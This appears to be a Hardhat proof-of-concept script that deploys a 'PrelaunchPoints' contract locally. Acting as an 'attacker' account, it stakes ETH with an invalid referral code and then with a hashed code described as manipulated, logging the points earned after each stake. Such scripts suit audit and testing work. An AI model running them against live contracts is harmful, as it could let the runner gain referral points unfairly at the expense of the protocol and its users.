const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    console.log("Deploying contract with the account:", attacker.address);

    // Deploy the contract
    const PrelaunchPoints = await ethers.getContractFactory("PrelaunchPoints");
    const pointsContract = await PrelaunchPoints.deploy(attacker.address);
    await pointsContract.deployed();

    console.log("Contract deployed to:", pointsContract.address);

    // Attacker stakes with an invalid referral code
    const invalidReferralCode = ethers.utils.formatBytes32String("INVALID_CODE");
    let tx = await pointsContract.stakeETH(invalidReferralCode, { value: ethers.utils.parseEther("1.0") });
    await tx.wait();
    console.log("Staked with invalid referral. Points:", (await pointsContract.points(attacker.address)).toString());

    // Attacker stakes with the correct valid referral code (manipulated)
    const validReferralCode = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("VALID_REFERRAL"));
    tx = await pointsContract.stakeETH(validReferralCode, { value: ethers.utils.parseEther("1.0") });
    await tx.wait();
    console.log("Staked with manipulated valid referral. Points:", (await pointsContract.points(attacker.address)).toString());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
